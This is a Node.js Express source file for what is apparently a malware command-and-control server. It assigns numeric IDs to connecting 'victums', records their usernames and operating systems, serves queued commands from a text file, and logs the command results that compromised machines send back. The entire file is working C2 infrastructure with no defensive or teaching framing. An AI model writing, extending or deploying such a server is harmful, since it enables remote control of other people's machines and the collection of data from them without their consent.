var express = require("express");
var app = express();
var bodyParser = require("body-parser");
const fs = require('fs');

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

app.get('/',function(req,res){
	res.sendfile("index.html");
	console.log("index");
});

app.post('/command',function(req,res){
	var clNum = req.body.num;
	var cmdRes = req.body.cmd;

	var timeStamp = getDateTime();
	var data = timeStamp + "\n Client: " + clNum + " Response: " + cmdRes;


	console.log(data);
	fs.appendFileSync("fileSave/data.txt", data, function(err){
		if(err){
			return console.log(err);
		}
	})
	res.end("");
});

//Gets data from file, file contains one line
//time:xx,xx,xx cnum:xxx cmd:xxxxx
app.get('/newCmd',function(req,res){
	res.sendfile("cmd.txt");
});

//Assigns a victum a number to pass data directly to it
var NEWID = 1;
app.get('/assignId', function(req,res){
	res.setHeader('Content-Type', 'application/json');
	res.end(JSON.stringify({ID: NEWID}));
	console.log(NEWID);
	NEWID++;
});

//Let's the server know that device is connected
//and with what ID
app.post('/checkIn',function(req,res){
	//Add id to checkin data.
	var user = req.body.username;
	var id = req.body.id;
	var os = req.body.os;
	addToListOfActiveClient(user, id, os);
	console.log("Added client with id: " + id + " and an os of: " + os 
		+ " and name: " + user);
	res.end("");
});

//Checkout for ID's that have been self terminated
app.post('/leave', function(req,res){
	//Add remove from active client list
	var id = req.body.id;
	removeFromListOfActiveClient(id);
	console.log("Client with ID:" + id + " lost connection.");
	res.end("");
});

app.listen(3000, function(){
	console.log("started on port 3000");
});

function getDateTime()
{
	var date = new Date();

	var hour = date.getHours();
	hour = (hour < 10 ? "0" : "") + hour;

	var min = date.getMinutes();
	min = (min < 10 ? "0" : "") + min;

	var sec = date.getSeconds();
	sec = (sec < 10 ? "0" : "") + sec;

	//add rest of time stamp
	return hour + ':' + min + ':' + sec;
}


var ActiveClients = [];

function addToListOfActiveClient(user, ID, OS)
{
	//add to list
	ActiveClients.push({
		username: user, 
		ClientId: ID,
		OS: OS
	});

	//write json to file
	writeClientsToFile()
}

function removeFromListOfActiveClient(ID)
{
	//remove from list
	for(var i = 0; i < ActiveClients.length; i++){
		if(ActiveClients[i].ClientId === ID){

			ActiveClients.splice(i, 1);
		}
	}
	//save to file
	writeClientsToFile();
}

function getListOfActiveClient()
{
	for(var i = 0; i < ActiveClients.length; i++){
		console.log("ClientID: " + ActiveClients[i].ClientId + 
			" with OS: " + ActiveClients[i].OS);
	}
}

function writeClientsToFile()
{
	var fs = require("fs");
	fs.writeFile("./fileSave/clients.json", JSON.stringify(ActiveClients), (err) => {
		if(err) {
			console.error(err);
			return;
		};
	});
}